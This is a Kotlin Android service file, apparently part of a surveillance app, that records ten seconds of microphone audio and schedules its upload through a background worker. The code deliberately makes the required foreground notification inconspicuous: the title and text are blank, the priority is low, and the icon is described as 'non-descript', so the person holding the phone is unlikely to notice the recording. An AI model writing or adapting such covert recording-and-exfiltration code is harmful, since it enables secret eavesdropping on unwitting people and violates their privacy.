// service/AudioRecordingService.kt
package com.elfinsaddle.service

import android.Manifest
import android.app.Notification
import android.app.Service
import android.content.Intent
import android.content.pm.PackageManager
import android.media.MediaRecorder
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.elfinsaddle.MainApplication
import com.elfinsaddle.R
import com.elfinsaddle.worker.DataFetchWorker
import kotlinx.coroutines.*
import java.io.File
import java.io.IOException

class AudioRecordingService : Service() {

    companion object {
        private const val TAG = "AudioRecordingService"
        private const val NOTIFICATION_ID = 3 // Use a unique ID
        private const val RECORDING_DURATION_MS = 10_000L // 10 seconds
    }

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var mediaRecorder: MediaRecorder? = null
    private var recordingFile: File? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "Service starting.")

        // Check for permission before proceeding
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "RECORD_AUDIO permission not granted. Stopping service.")
            stopSelf()
            return START_NOT_STICKY
        }

        // Start the service in the foreground with a silent notification
        startForeground(NOTIFICATION_ID, createSilentNotification())

        // Launch a coroutine to handle the timed recording
        serviceScope.launch {
            if (startRecording()) {
                Log.d(TAG, "Recording started. Waiting for ${RECORDING_DURATION_MS}ms.")
                delay(RECORDING_DURATION_MS)
                stopRecordingAndScheduleUpload()
            } else {
                Log.e(TAG, "Failed to start recording. Shutting down.")
            }
            // Stop the service and remove the notification
            Log.d(TAG, "Recording task finished. Stopping service.")
            stopForeground(true)
            stopSelf()
        }

        return START_NOT_STICKY
    }

    private fun createSilentNotification(): Notification {
        // This notification is minimal. IMPORTANCE_LOW ensures it's silent and less intrusive.
        return NotificationCompat.Builder(this, MainApplication.AUDIO_RECORDING_CHANNEL_ID)
            .setContentTitle("") // No title
            .setContentText("")  // No text
            .setSmallIcon(R.drawable.ic_recording_dot) // A small, non-descript icon is required
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    private fun startRecording(): Boolean {
        // Create the file to save the recording
        recordingFile = File(cacheDir, "recording_${System.currentTimeMillis()}.amr")

        // Initialize MediaRecorder
        val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(this)
        } else {
            @Suppress("DEPRECATION")
            MediaRecorder()
        }

        mediaRecorder = recorder.apply {
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setOutputFormat(MediaRecorder.OutputFormat.AMR_NB) // Efficient format for voice
            setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
            setOutputFile(recordingFile?.absolutePath)
            try {
                prepare()
                start()
                Log.i(TAG, "MediaRecorder started, saving to ${recordingFile?.absolutePath}")
                return true
            } catch (e: IOException) {
                Log.e(TAG, "MediaRecorder prepare() failed", e)
                return false
            } catch (e: IllegalStateException) {
                Log.e(TAG, "MediaRecorder start() failed", e)
                return false
            }
        }
        return false
    }

    private fun stopRecordingAndScheduleUpload() {
        try {
            mediaRecorder?.apply {
                stop()
                release()
            }
            mediaRecorder = null
            Log.i(TAG, "MediaRecorder stopped successfully.")

            recordingFile?.let { file ->
                if (file.exists() && file.length() > 0) {
                    Log.d(TAG, "Scheduling upload for file: ${file.absolutePath}")
                    // Use WorkManager to handle the upload reliably in the background
                    DataFetchWorker.scheduleWork(
                        applicationContext,
                        DataFetchWorker.COMMAND_UPLOAD_AUDIO_RECORDING,
                        mapOf(DataFetchWorker.KEY_FILE_PATH to file.absolutePath)
                    )
                } else {
                    Log.w(TAG, "Recording file is empty or does not exist. No upload scheduled.")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping MediaRecorder or scheduling upload", e)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        // Ensure all resources are released
        serviceScope.cancel()
        if (mediaRecorder != null) {
            stopRecordingAndScheduleUpload()
        }
        Log.d(TAG, "Service destroyed.")
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null // Not a bound service
    }
}
